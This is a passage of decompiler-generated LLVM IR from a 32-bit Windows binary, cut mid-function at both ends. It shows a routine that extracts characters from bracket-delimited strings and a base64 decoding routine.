  %6 = sub i32 %ebx.0.reload, %0, !insn.addr !1093
  %7 = ashr i32 %6, 31, !insn.addr !1094
  %8 = sub i32 %6, %7, !insn.addr !1095
  %9 = sdiv i32 %8, 2, !insn.addr !1096
  %10 = call i32* @_malloc(i32 %9), !insn.addr !1097
  %11 = ptrtoint i32* %10 to i32, !insn.addr !1097
  %12 = call i32* @_memset(i32* %10, i32 0, i32 %9), !insn.addr !1098
  %13 = icmp slt i32 %6, 1
  br i1 %13, label %dec_label_pc_409ad7, label %dec_label_pc_409a78.preheader, !insn.addr !1099

dec_label_pc_409a78.preheader:                    ; preds = %dec_label_pc_409a48
  %14 = add i32 %0, 1
  store i32 0, i32* %stack_var_-20.0.reg2mem
  store i32 0, i32* %edi.0.reg2mem
  br label %dec_label_pc_409a78

dec_label_pc_409a78:                              ; preds = %dec_label_pc_409a78.preheader, %dec_label_pc_409acf
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %stack_var_-20.0.reload = load i32, i32* %stack_var_-20.0.reg2mem
  %15 = add i32 %stack_var_-20.0.reload, %0, !insn.addr !1100
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1100
  %17 = load i8, i8* %16, align 1, !insn.addr !1100
  %18 = icmp eq i8 %17, 91, !insn.addr !1100
  %19 = icmp eq i1 %18, false, !insn.addr !1101
  store i32 %stack_var_-20.0.reload, i32* %eax.2.reg2mem, !insn.addr !1101
  store i32 %edi.0.reload, i32* %edi.3.reg2mem, !insn.addr !1101
  br i1 %19, label %dec_label_pc_409acf, label %dec_label_pc_409a7e, !insn.addr !1101

dec_label_pc_409a7e:                              ; preds = %dec_label_pc_409a78
  %20 = add i32 %stack_var_-20.0.reload, %14, !insn.addr !1102
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1102
  %22 = load i8, i8* %21, align 1, !insn.addr !1102
  %23 = icmp eq i8 %22, 91, !insn.addr !1102
  %24 = icmp eq i1 %23, false, !insn.addr !1103
  store i32 %stack_var_-20.0.reload, i32* %eax.2.reg2mem, !insn.addr !1103
  store i32 %edi.0.reload, i32* %edi.3.reg2mem, !insn.addr !1103
  br i1 %24, label %dec_label_pc_409acf, label %dec_label_pc_409a85, !insn.addr !1103

dec_label_pc_409a85:                              ; preds = %dec_label_pc_409a7e
  %25 = add i32 %stack_var_-20.0.reload, 2, !insn.addr !1104
  %26 = icmp slt i32 %25, %6, !insn.addr !1105
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !1105
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !1105
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !1105
  store i32 %stack_var_-20.0.reload, i32* %eax.2.reg2mem, !insn.addr !1105
  store i32 %edi.0.reload, i32* %edi.3.reg2mem, !insn.addr !1105
  br i1 %26, label %dec_label_pc_409a90, label %dec_label_pc_409acf, !insn.addr !1105

dec_label_pc_409a90:                              ; preds = %dec_label_pc_409a85, %dec_label_pc_409ac4
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %27 = add i32 %ecx.0.reload, %0, !insn.addr !1106
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1106
  %29 = load i8, i8* %28, align 1, !insn.addr !1106
  %30 = icmp eq i8 %29, 93, !insn.addr !1107
  %31 = icmp eq i1 %30, false, !insn.addr !1108
  br i1 %31, label %dec_label_pc_409a9e, label %dec_label_pc_409a98, !insn.addr !1108

dec_label_pc_409a98:                              ; preds = %dec_label_pc_409a90
  %32 = add i32 %ecx.0.reload, %14, !insn.addr !1109
  %33 = inttoptr i32 %32 to i8*, !insn.addr !1109
  %34 = load i8, i8* %33, align 1, !insn.addr !1109
  %35 = icmp eq i8 %34, %29, !insn.addr !1109
  br i1 %35, label %dec_label_pc_409ae1, label %dec_label_pc_409a9e, !insn.addr !1110

dec_label_pc_409a9e:                              ; preds = %dec_label_pc_409a98, %dec_label_pc_409a90
  %36 = add i32 %esi.0.reload, 1, !insn.addr !1111
  %37 = icmp slt i32 %36, 1
  store i32 %edi.1.reload, i32* %edi.2.reg2mem, !insn.addr !1112
  br i1 %37, label %dec_label_pc_409ac4, label %dec_label_pc_409aa3, !insn.addr !1112

dec_label_pc_409aa3:                              ; preds = %dec_label_pc_409a9e
  %38 = sext i32 %36 to i64, !insn.addr !1113
  %39 = mul nsw i64 %38, 1431655766, !insn.addr !1113
  %40 = udiv i64 %39, 4294967296, !insn.addr !1113
  %41 = trunc i64 %40 to i32, !insn.addr !1113
  %42 = lshr i64 %39, 63
  %43 = trunc i64 %42 to i32, !insn.addr !1114
  %44 = add i32 %43, %41, !insn.addr !1115
  %45 = mul i32 %44, 3
  %46 = icmp eq i32 %36, %45, !insn.addr !1116
  %47 = icmp eq i1 %46, false, !insn.addr !1117
  store i32 %edi.1.reload, i32* %edi.2.reg2mem, !insn.addr !1117
  br i1 %47, label %dec_label_pc_409ac4, label %dec_label_pc_409abd, !insn.addr !1117

dec_label_pc_409abd:                              ; preds = %dec_label_pc_409aa3
  %48 = add i32 %edi.1.reload, %11, !insn.addr !1118
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1118
  store i8 %29, i8* %49, align 1, !insn.addr !1118
  %50 = add i32 %edi.1.reload, 1, !insn.addr !1119
  store i32 %50, i32* %edi.2.reg2mem, !insn.addr !1119
  br label %dec_label_pc_409ac4, !insn.addr !1119

dec_label_pc_409ac4:                              ; preds = %dec_label_pc_409abd, %dec_label_pc_409aa3, %dec_label_pc_409a9e
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %51 = add i32 %ecx.0.reload, 1, !insn.addr !1120
  %52 = icmp slt i32 %51, %6, !insn.addr !1121
  store i32 %51, i32* %ecx.0.reg2mem, !insn.addr !1121
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1121
  store i32 %edi.2.reload, i32* %edi.1.reg2mem, !insn.addr !1121
  store i32 %stack_var_-20.0.reload, i32* %eax.2.reg2mem, !insn.addr !1121
  store i32 %edi.2.reload, i32* %edi.3.reg2mem, !insn.addr !1121
  br i1 %52, label %dec_label_pc_409a90, label %dec_label_pc_409acf, !insn.addr !1121

dec_label_pc_409acf:                              ; preds = %dec_label_pc_409ac4, %dec_label_pc_409a85, %dec_label_pc_409ae1, %dec_label_pc_409a7e, %dec_label_pc_409a78
  %edi.3.reload = load i32, i32* %edi.3.reg2mem
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %53 = add i32 %eax.2.reload, 1, !insn.addr !1122
  %54 = icmp slt i32 %53, %6, !insn.addr !1123
  store i32 %53, i32* %stack_var_-20.0.reg2mem, !insn.addr !1123
  store i32 %edi.3.reload, i32* %edi.0.reg2mem, !insn.addr !1123
  br i1 %54, label %dec_label_pc_409a78, label %dec_label_pc_409ad7, !insn.addr !1123

dec_label_pc_409ad7:                              ; preds = %dec_label_pc_409acf, %dec_label_pc_409a48
  ret i32 %11, !insn.addr !1124

dec_label_pc_409ae1:                              ; preds = %dec_label_pc_409a98
  %55 = add i32 %ecx.0.reload, 1, !insn.addr !1125
  store i32 %55, i32* %eax.2.reg2mem, !insn.addr !1126
  store i32 %edi.1.reload, i32* %edi.3.reg2mem, !insn.addr !1126
  br label %dec_label_pc_409acf, !insn.addr !1126
}

define i32 @function_409af0() local_unnamed_addr {
dec_label_pc_409af0:
  %ebx.3.reg2mem = alloca i32, !insn.addr !1127
  %stack_var_-8.2.reg2mem = alloca i8*, !insn.addr !1127
  %.reg2mem28 = alloca i32, !insn.addr !1127
  %.pn.reg2mem = alloca i32, !insn.addr !1127
  %stack_var_-8.1.reg2mem = alloca i8*, !insn.addr !1127
  %.reg2mem26 = alloca i32, !insn.addr !1127
  %eax.5.reg2mem = alloca i32, !insn.addr !1127
  %ecx.1.reg2mem = alloca i32, !insn.addr !1127
  %.reg2mem24 = alloca i32, !insn.addr !1127
  %.pn17.reg2mem = alloca i32, !insn.addr !1127
  %.pn5.reg2mem = alloca i32, !insn.addr !1127
  %.reg2mem22 = alloca i32, !insn.addr !1127
  %.reg2mem20 = alloca i32, !insn.addr !1127
  %esi.1.reg2mem = alloca i32, !insn.addr !1127
  %stack_var_-8.0.reg2mem = alloca i8*, !insn.addr !1127
  %.reg2mem18 = alloca i32, !insn.addr !1127
  %edi.1.reg2mem = alloca i32, !insn.addr !1127
  %edi.0.reg2mem = alloca i32, !insn.addr !1127
  %esi.0.reg2mem = alloca i32, !insn.addr !1127
  %.reg2mem = alloca i8, !insn.addr !1127
  %edx = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = icmp eq i32 %0, 0, !insn.addr !1128
  %3 = trunc i32 %0 to i8
  %4 = icmp eq i8 %3, 0, !insn.addr !1129
  %or.cond = or i1 %2, %4
  br i1 %or.cond, label %dec_label_pc_409ce3, label %dec_label_pc_409b34.preheader, !insn.addr !1130

dec_label_pc_409b34.preheader:                    ; preds = %dec_label_pc_409af0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !1131
  %6 = inttoptr i32 %1 to i8*, !insn.addr !1132
  %7 = call i32 @lstrlenA(i8* %5), !insn.addr !1133
  %8 = add i32 %7, 1, !insn.addr !1134
  %9 = call i32* @LocalAlloc(i32 64, i32 %8), !insn.addr !1135
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1135
  %.pre = load i8, i8* %5, align 1
  store i8 %.pre, i8* %.reg2mem
  store i32 0, i32* %edi.0.reg2mem
  br label %dec_label_pc_409b34

dec_label_pc_409b34:                              ; preds = %dec_label_pc_409b34.preheader, %dec_label_pc_409b67
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %.reload = load i8, i8* %.reg2mem, !insn.addr !1136
  %11 = and i8 %.reload, -33
  %12 = add i8 %11, -65
  %13 = icmp ult i8 %12, 26
  br i1 %13, label %dec_label_pc_409b63, label %dec_label_pc_409b4a, !insn.addr !1137

dec_label_pc_409b4a:                              ; preds = %dec_label_pc_409b34
  %.off13 = add i8 %.reload, -48
  %14 = icmp ugt i8 %.off13, 9
  %15 = or i8 %.reload, 4
  %16 = icmp ne i8 %15, 47
  %or.cond9.not = icmp eq i1 %14, %16
  %17 = icmp eq i8 %.reload, 61, !insn.addr !1138
  %18 = icmp eq i1 %17, false, !insn.addr !1139
  %or.cond11 = icmp eq i1 %18, %or.cond9.not
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !1140
  br i1 %or.cond11, label %dec_label_pc_409b67, label %dec_label_pc_409b63, !insn.addr !1140

dec_label_pc_409b63:                              ; preds = %dec_label_pc_409b4a, %dec_label_pc_409b34
  %19 = add i32 %edi.0.reload, %10, !insn.addr !1141
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1141
  store i8 %.reload, i8* %20, align 1, !insn.addr !1141
  %21 = add i32 %edi.0.reload, 1, !insn.addr !1142
  store i32 %21, i32* %edi.1.reg2mem, !insn.addr !1142
  br label %dec_label_pc_409b67, !insn.addr !1142

dec_label_pc_409b67:                              ; preds = %dec_label_pc_409b4a, %dec_label_pc_409b63
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %22 = add i32 %esi.0.reload, 1, !insn.addr !1143
  %23 = inttoptr i32 %22 to i8*, !insn.addr !1144
  %24 = load i8, i8* %23, align 1, !insn.addr !1144
  %25 = icmp eq i8 %24, 0, !insn.addr !1144
  %26 = icmp eq i1 %25, false, !insn.addr !1145
  store i8 %24, i8* %.reg2mem, !insn.addr !1145
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1145
  store i32 %edi.1.reload, i32* %edi.0.reg2mem, !insn.addr !1145
  br i1 %26, label %dec_label_pc_409b34, label %dec_label_pc_409b70, !insn.addr !1145

dec_label_pc_409b70:                              ; preds = %dec_label_pc_409b67
  %27 = icmp slt i32 %edi.1.reload, 1
  br i1 %27, label %dec_label_pc_409cd0, label %dec_label_pc_409b80.preheader, !insn.addr !1146

dec_label_pc_409b80.preheader:                    ; preds = %dec_label_pc_409b70
  %.pre15 = load i32, i32* %edx, align 4
  store i32 %.pre15, i32* %.reg2mem18
  store i8* %6, i8** %stack_var_-8.0.reg2mem
  store i32 0, i32* %esi.1.reg2mem
  br label %dec_label_pc_409b80

dec_label_pc_409b80:                              ; preds = %dec_label_pc_409b80.preheader, %dec_label_pc_409cbf
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %stack_var_-8.0.reload = load i8*, i8** %stack_var_-8.0.reg2mem
  %.reload19 = load i32, i32* %.reg2mem18, !insn.addr !1147
  %28 = add i32 %esi.1.reload, %10, !insn.addr !1148
  %29 = inttoptr i32 %28 to i8*, !insn.addr !1148
  %30 = load i8, i8* %29, align 1, !insn.addr !1148
  %31 = or i32 %esi.1.reload, 1, !insn.addr !1149
  %32 = and i32 %.reload19, -65536, !insn.addr !1147
  %33 = or i32 %32, 16705, !insn.addr !1150
  store i32 %33, i32* %edx, align 4, !insn.addr !1150
  %34 = icmp slt i32 %31, %edi.1.reload, !insn.addr !1151
  store i32 %33, i32* %.reg2mem20, !insn.addr !1151
  br i1 %34, label %dec_label_pc_409b90, label %dec_label_pc_409b94, !insn.addr !1151

dec_label_pc_409b90:                              ; preds = %dec_label_pc_409b80
  %35 = add i32 %31, %10, !insn.addr !1152
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1152
  %37 = load i8, i8* %36, align 1, !insn.addr !1152
  %38 = zext i8 %37 to i32, !insn.addr !1152
  %39 = or i32 %32, %38, !insn.addr !1152
  %40 = or i32 %39, 16640, !insn.addr !1152
  store i32 %40, i32* %edx, align 4, !insn.addr !1152
  store i32 %40, i32* %.reg2mem20, !insn.addr !1152
  br label %dec_label_pc_409b94, !insn.addr !1152

dec_label_pc_409b94:                              ; preds = %dec_label_pc_409b80, %dec_label_pc_409b90
  %.reload21 = load i32, i32* %.reg2mem20, !insn.addr !1153
  %41 = add nuw nsw i32 %31, 1, !insn.addr !1154
  %42 = icmp slt i32 %41, %edi.1.reload, !insn.addr !1155
  store i32 %.reload21, i32* %.reg2mem22, !insn.addr !1155
  br i1 %42, label %dec_label_pc_409b9b, label %dec_label_pc_409ba2, !insn.addr !1155

dec_label_pc_409b9b:                              ; preds = %dec_label_pc_409b94
  %43 = or i32 %esi.1.reload, 2, !insn.addr !1153
  %44 = add i32 %43, %10, !insn.addr !1153
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1153
  %46 = load i8, i8* %45, align 1, !insn.addr !1153
  %47 = zext i8 %46 to i32, !insn.addr !1153
  %48 = mul i32 %47, 256, !insn.addr !1153
  %49 = and i32 %.reload21, -65281, !insn.addr !1153
  %50 = or i32 %48, %49, !insn.addr !1153
  store i32 %50, i32* %edx, align 4, !insn.addr !1153
  store i32 %50, i32* %.reg2mem22, !insn.addr !1153
  br label %dec_label_pc_409ba2, !insn.addr !1153

dec_label_pc_409ba2:                              ; preds = %dec_label_pc_409b94, %dec_label_pc_409b9b
  %.reload23 = load i32, i32* %.reg2mem22
  %51 = or i32 %esi.1.reload, 3, !insn.addr !1156
  %52 = icmp slt i32 %51, %edi.1.reload, !insn.addr !1157
  store i32 16640, i32* %.pn5.reg2mem, !insn.addr !1157
  br i1 %52, label %dec_label_pc_409ba9, label %dec_label_pc_409bb0, !insn.addr !1157

dec_label_pc_409ba9:                              ; preds = %dec_label_pc_409ba2
  %53 = add i32 %51, %10, !insn.addr !1158
  %54 = inttoptr i32 %53 to i8*, !insn.addr !1158
  %55 = load i8, i8* %54, align 1, !insn.addr !1158
  %56 = zext i8 %55 to i32, !insn.addr !1158
  %57 = mul i32 %56, 256, !insn.addr !1158
  store i32 %57, i32* %.pn5.reg2mem, !insn.addr !1158
  br label %dec_label_pc_409bb0, !insn.addr !1158

dec_label_pc_409bb0:                              ; preds = %dec_label_pc_409ba2, %dec_label_pc_409ba9
  %.pn5.reload = load i32, i32* %.pn5.reg2mem
  %58 = add i8 %30, -65, !insn.addr !1159
  %59 = icmp ult i8 %58, 26
  br i1 %59, label %dec_label_pc_409bb8, label %dec_label_pc_409bbd, !insn.addr !1160

dec_label_pc_409bb8:                              ; preds = %dec_label_pc_409bb0
  %60 = zext i8 %58 to i32, !insn.addr !1161
  store i32 %60, i32* %.pn17.reg2mem, !insn.addr !1162
  br label %dec_label_pc_409be0, !insn.addr !1162

dec_label_pc_409bbd:                              ; preds = %dec_label_pc_409bb0
  %61 = add i8 %30, -97, !insn.addr !1163
  %62 = icmp ult i8 %61, 26
  br i1 %62, label %dec_label_pc_409bc5, label %dec_label_pc_409bca, !insn.addr !1164

dec_label_pc_409bc5:                              ; preds = %dec_label_pc_409bbd
  %63 = add i8 %30, -71
  %64 = zext i8 %63 to i32, !insn.addr !1165
  store i32 %64, i32* %.pn17.reg2mem, !insn.addr !1166
  br label %dec_label_pc_409be0, !insn.addr !1166

dec_label_pc_409bca:                              ; preds = %dec_label_pc_409bbd
  %65 = add i8 %30, -48, !insn.addr !1167
  %66 = icmp ult i8 %65, 10
  br i1 %66, label %dec_label_pc_409bd2, label %dec_label_pc_409bd7, !insn.addr !1168

dec_label_pc_409bd2:                              ; preds = %dec_label_pc_409bca
  %67 = add i8 %30, 4
  %68 = zext i8 %67 to i32, !insn.addr !1169
  store i32 %68, i32* %.pn17.reg2mem, !insn.addr !1170
  br label %dec_label_pc_409be0, !insn.addr !1170

dec_label_pc_409bd7:                              ; preds = %dec_label_pc_409bca
  %69 = icmp eq i8 %30, 43, !insn.addr !1171
  %70 = icmp eq i1 %69, false, !insn.addr !1172
  %71 = select i1 %70, i32 63, i32 62, !insn.addr !1173
  store i32 %71, i32* %.pn17.reg2mem, !insn.addr !1173
  br label %dec_label_pc_409be0, !insn.addr !1173

dec_label_pc_409be0:                              ; preds = %dec_label_pc_409bd7, %dec_label_pc_409bd2, %dec_label_pc_409bc5, %dec_label_pc_409bb8
  %.pn17.reload = load i32, i32* %.pn17.reg2mem
  %72 = trunc i32 %.reload23 to i8
  %73 = add i8 %72, -65, !insn.addr !1174
  %74 = icmp ult i8 %73, 26
  br i1 %74, label %dec_label_pc_409be8, label %dec_label_pc_409bed, !insn.addr !1175

dec_label_pc_409be8:                              ; preds = %dec_label_pc_409be0
  %75 = add i32 %.reload23, 191, !insn.addr !1176
  %76 = and i32 %75, 255, !insn.addr !1176
  %77 = and i32 %.reload23, -256, !insn.addr !1176
  %78 = or i32 %76, %77, !insn.addr !1176
  store i32 %78, i32* %edx, align 4, !insn.addr !1176
  store i32 %78, i32* %.reg2mem24, !insn.addr !1177
  br label %dec_label_pc_409c10, !insn.addr !1177

dec_label_pc_409bed:                              ; preds = %dec_label_pc_409be0
  %79 = add i8 %72, -97, !insn.addr !1178
  %80 = icmp ult i8 %79, 26
  br i1 %80, label %dec_label_pc_409bf5, label %dec_label_pc_409bfa, !insn.addr !1179

dec_label_pc_409bf5:                              ; preds = %dec_label_pc_409bed
  %81 = add i32 %.reload23, 185, !insn.addr !1180
  %82 = and i32 %81, 255, !insn.addr !1180
  %83 = and i32 %.reload23, -256, !insn.addr !1180
  %84 = or i32 %82, %83, !insn.addr !1180
  store i32 %84, i32* %edx, align 4, !insn.addr !1180
  store i32 %84, i32* %.reg2mem24, !insn.addr !1181
  br label %dec_label_pc_409c10, !insn.addr !1181

dec_label_pc_409bfa:                              ; preds = %dec_label_pc_409bed
  %85 = add i8 %72, -48, !insn.addr !1182
  %86 = icmp ult i8 %85, 10
  br i1 %86, label %dec_label_pc_409c02, label %dec_label_pc_409c07, !insn.addr !1183

dec_label_pc_409c02:                              ; preds = %dec_label_pc_409bfa
  %87 = add i32 %.reload23, 4, !insn.addr !1184
  %88 = and i32 %87, 255, !insn.addr !1184
  %89 = and i32 %.reload23, -256, !insn.addr !1184
  %90 = or i32 %88, %89, !insn.addr !1184
  store i32 %90, i32* %edx, align 4, !insn.addr !1184
  store i32 %90, i32* %.reg2mem24, !insn.addr !1185
  br label %dec_label_pc_409c10, !insn.addr !1185

dec_label_pc_409c07:                              ; preds = %dec_label_pc_409bfa
  %91 = icmp eq i8 %72, 43, !insn.addr !1186
  %92 = icmp eq i1 %91, false, !insn.addr !1187
  %93 = and i32 %.reload23, -256, !insn.addr !1187
  %94 = select i1 %92, i32 63, i32 62, !insn.addr !1188
  %95 = or i32 %94, %93, !insn.addr !1188
  store i32 %95, i32* %edx, align 4, !insn.addr !1188
  store i32 %95, i32* %.reg2mem24, !insn.addr !1188
  br label %dec_label_pc_409c10, !insn.addr !1188

dec_label_pc_409c10:                              ; preds = %dec_label_pc_409c07, %dec_label_pc_409c02, %dec_label_pc_409bf5, %dec_label_pc_409be8
  %.reload25 = load i32, i32* %.reg2mem24, !insn.addr !1189
  %96 = udiv i32 %.reload25, 256, !insn.addr !1190
  %97 = trunc i32 %96 to i8
  %98 = add i8 %97, -65, !insn.addr !1191
  %99 = icmp ult i8 %98, 26
  br i1 %99, label %dec_label_pc_409c18, label %dec_label_pc_409c1f, !insn.addr !1192

dec_label_pc_409c18:                              ; preds = %dec_label_pc_409c10
  %100 = add nuw nsw i32 %96, 191, !insn.addr !1193
  %101 = and i32 %100, 255, !insn.addr !1193
  store i32 %101, i32* %ecx.1.reg2mem, !insn.addr !1194
  br label %dec_label_pc_409c46, !insn.addr !1194

dec_label_pc_409c1f:                              ; preds = %dec_label_pc_409c10
  %102 = add i8 %97, -97, !insn.addr !1195
  %103 = icmp ult i8 %102, 26
  br i1 %103, label %dec_label_pc_409c27, label %dec_label_pc_409c2e, !insn.addr !1196

dec_label_pc_409c27:                              ; preds = %dec_label_pc_409c1f
  %104 = add nuw nsw i32 %96, 185, !insn.addr !1197
  %105 = and i32 %104, 255, !insn.addr !1197
  store i32 %105, i32* %ecx.1.reg2mem, !insn.addr !1198
  br label %dec_label_pc_409c46, !insn.addr !1198

dec_label_pc_409c2e:                              ; preds = %dec_label_pc_409c1f
  %106 = add i8 %97, -48, !insn.addr !1199
  %107 = icmp ult i8 %106, 10
  br i1 %107, label %dec_label_pc_409c36, label %dec_label_pc_409c3d, !insn.addr !1200

dec_label_pc_409c36:                              ; preds = %dec_label_pc_409c2e
  %108 = add nuw nsw i32 %96, 4, !insn.addr !1201
  %109 = and i32 %108, 255, !insn.addr !1201
  store i32 %109, i32* %ecx.1.reg2mem, !insn.addr !1202
  br label %dec_label_pc_409c46, !insn.addr !1202

dec_label_pc_409c3d:                              ; preds = %dec_label_pc_409c2e
  %110 = icmp eq i8 %97, 43, !insn.addr !1203
  %111 = icmp eq i1 %110, false, !insn.addr !1204
  %112 = select i1 %111, i32 63, i32 62, !insn.addr !1205
  store i32 %112, i32* %ecx.1.reg2mem, !insn.addr !1205
  br label %dec_label_pc_409c46, !insn.addr !1205

dec_label_pc_409c46:                              ; preds = %dec_label_pc_409c3d, %dec_label_pc_409c36, %dec_label_pc_409c27, %dec_label_pc_409c18
  %ebx.2 = or i32 %.pn17.reload, %.pn5.reload
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %113 = udiv i32 %.pn5.reload, 256, !insn.addr !1206
  %114 = trunc i32 %113 to i8
  %115 = add i8 %114, -65, !insn.addr !1207
  %116 = icmp ult i8 %115, 26
  br i1 %116, label %dec_label_pc_409c4e, label %dec_label_pc_409c55, !insn.addr !1208

dec_label_pc_409c4e:                              ; preds = %dec_label_pc_409c46
  %117 = add nsw i32 %ebx.2, 48896
  %118 = and i32 %117, 65280, !insn.addr !1209
  store i32 %118, i32* %eax.5.reg2mem, !insn.addr !1210
  br label %dec_label_pc_409c7c, !insn.addr !1210

dec_label_pc_409c55:                              ; preds = %dec_label_pc_409c46
  %119 = add i8 %114, -97, !insn.addr !1211
  %120 = icmp ult i8 %119, 26
  br i1 %120, label %dec_label_pc_409c5d, label %dec_label_pc_409c64, !insn.addr !1212

dec_label_pc_409c5d:                              ; preds = %dec_label_pc_409c55
  %121 = add nsw i32 %ebx.2, 47360
  %122 = and i32 %121, 65280, !insn.addr !1213
  store i32 %122, i32* %eax.5.reg2mem, !insn.addr !1214
  br label %dec_label_pc_409c7c, !insn.addr !1214

dec_label_pc_409c64:                              ; preds = %dec_label_pc_409c55
  %123 = add i8 %114, -48, !insn.addr !1215
  %124 = icmp ult i8 %123, 10
  br i1 %124, label %dec_label_pc_409c6c, label %dec_label_pc_409c73, !insn.addr !1216

dec_label_pc_409c6c:                              ; preds = %dec_label_pc_409c64
  %125 = add nsw i32 %ebx.2, 1024
  %126 = and i32 %125, 65280, !insn.addr !1217
  store i32 %126, i32* %eax.5.reg2mem, !insn.addr !1218
  br label %dec_label_pc_409c7c, !insn.addr !1218

dec_label_pc_409c73:                              ; preds = %dec_label_pc_409c64
  %127 = and i32 %.pn5.reload, 65280
  %128 = icmp eq i32 %127, 11008, !insn.addr !1219
  %129 = icmp eq i1 %128, false, !insn.addr !1220
  %130 = zext i1 %129 to i32, !insn.addr !1220
  %131 = mul i32 %130, 256, !insn.addr !1221
  %132 = or i32 %131, 15872, !insn.addr !1221
  store i32 %132, i32* %eax.5.reg2mem, !insn.addr !1221
  br label %dec_label_pc_409c7c, !insn.addr !1221

dec_label_pc_409c7c:                              ; preds = %dec_label_pc_409c73, %dec_label_pc_409c6c, %dec_label_pc_409c5d, %dec_label_pc_409c4e
  %eax.5.reload = load i32, i32* %eax.5.reg2mem
  %133 = ptrtoint i8* %stack_var_-8.0.reload to i32, !insn.addr !1222
  %134 = udiv i32 %.reload25, 16, !insn.addr !1223
  %135 = and i32 %134, 15, !insn.addr !1223
  %136 = mul i32 %ebx.2, 4, !insn.addr !1224
  %137 = and i32 %136, 252, !insn.addr !1224
  %138 = or i32 %135, %137, !insn.addr !1225
  %139 = trunc i32 %138 to i8, !insn.addr !1226
  store i8 %139, i8* %stack_var_-8.0.reload, align 1, !insn.addr !1226
  %140 = add i32 %133, 1, !insn.addr !1227
  %141 = inttoptr i32 %140 to i8*, !insn.addr !1228
  %142 = load i32, i32* %edx, align 4, !insn.addr !1229
  %143 = and i32 %142, 65280
  %144 = icmp eq i32 %143, 15616, !insn.addr !1229
  br i1 %144, label %dec_label_pc_409cac, label %dec_label_pc_409c97, !insn.addr !1230

dec_label_pc_409c97:                              ; preds = %dec_label_pc_409c7c
  %145 = mul i32 %142, 16, !insn.addr !1231
  %146 = udiv i32 %ecx.1.reload, 4, !insn.addr !1232
  %.masked3 = and i32 %145, 240
  %147 = or i32 %.masked3, %146, !insn.addr !1233
  %148 = trunc i32 %147 to i8, !insn.addr !1234
  store i8 %148, i8* %141, align 1, !insn.addr !1234
  %149 = add i32 %133, 2, !insn.addr !1235
  store i32 %149, i32* %edx, align 4, !insn.addr !1235
  %150 = inttoptr i32 %149 to i8*, !insn.addr !1236
  store i32 %149, i32* %.reg2mem26, !insn.addr !1237
  store i8* %150, i8** %stack_var_-8.1.reg2mem, !insn.addr !1237
  store i32 %147, i32* %.pn.reg2mem, !insn.addr !1237
  br label %dec_label_pc_409caf, !insn.addr !1237

dec_label_pc_409cac:                              ; preds = %dec_label_pc_409c7c
  store i32 %140, i32* %edx, align 4, !insn.addr !1238
  store i32 %140, i32* %.reg2mem26, !insn.addr !1238
  store i8* %141, i8** %stack_var_-8.1.reg2mem, !insn.addr !1238
  store i32 %138, i32* %.pn.reg2mem, !insn.addr !1238
  br label %dec_label_pc_409caf, !insn.addr !1238

dec_label_pc_409caf:                              ; preds = %dec_label_pc_409cac, %dec_label_pc_409c97
  %stack_var_-8.1.reload = load i8*, i8** %stack_var_-8.1.reg2mem
  %.reload27 = load i32, i32* %.reg2mem26, !insn.addr !1239
  %151 = and i32 %.pn5.reload, 65280
  %152 = icmp eq i32 %151, 15616, !insn.addr !1240
  store i32 %.reload27, i32* %.reg2mem28, !insn.addr !1241
  store i8* %stack_var_-8.1.reload, i8** %stack_var_-8.2.reg2mem, !insn.addr !1241
  br i1 %152, label %dec_label_pc_409cbf, label %dec_label_pc_409cb4, !insn.addr !1241

dec_label_pc_409cb4:                              ; preds = %dec_label_pc_409caf
  %.pn.reload = load i32, i32* %.pn.reg2mem
  %eax.6 = or i32 %.pn.reload, %eax.5.reload
  %153 = mul i32 %ecx.1.reload, 64, !insn.addr !1242
  %154 = udiv i32 %eax.6, 256, !insn.addr !1243
  %155 = or i32 %154, %153
  %156 = trunc i32 %155 to i8, !insn.addr !1239
  %157 = inttoptr i32 %.reload27 to i8*, !insn.addr !1239
  store i8 %156, i8* %157, align 1, !insn.addr !1239
  %158 = load i32, i32* %edx, align 4, !insn.addr !1244
  %159 = add i32 %158, 1, !insn.addr !1244
  store i32 %159, i32* %edx, align 4, !insn.addr !1244
  %160 = inttoptr i32 %159 to i8*, !insn.addr !1245
  store i32 %159, i32* %.reg2mem28, !insn.addr !1245
  store i8* %160, i8** %stack_var_-8.2.reg2mem, !insn.addr !1245
  br label %dec_label_pc_409cbf, !insn.addr !1245

dec_label_pc_409cbf:                              ; preds = %dec_label_pc_409cb4, %dec_label_pc_409caf
  %stack_var_-8.2.reload = load i8*, i8** %stack_var_-8.2.reg2mem
  %.reload29 = load i32, i32* %.reg2mem28
  %161 = add i32 %esi.1.reload, 4, !insn.addr !1246
  %162 = icmp slt i32 %161, %edi.1.reload, !insn.addr !1247
  store i32 %.reload29, i32* %.reg2mem18, !insn.addr !1247
  store i8* %stack_var_-8.2.reload, i8** %stack_var_-8.0.reg2mem, !insn.addr !1247
  store i32 %161, i32* %esi.1.reg2mem, !insn.addr !1247
  br i1 %162, label %dec_label_pc_409b80, label %dec_label_pc_409ccd, !insn.addr !1247

dec_label_pc_409ccd:                              ; preds = %dec_label_pc_409cbf
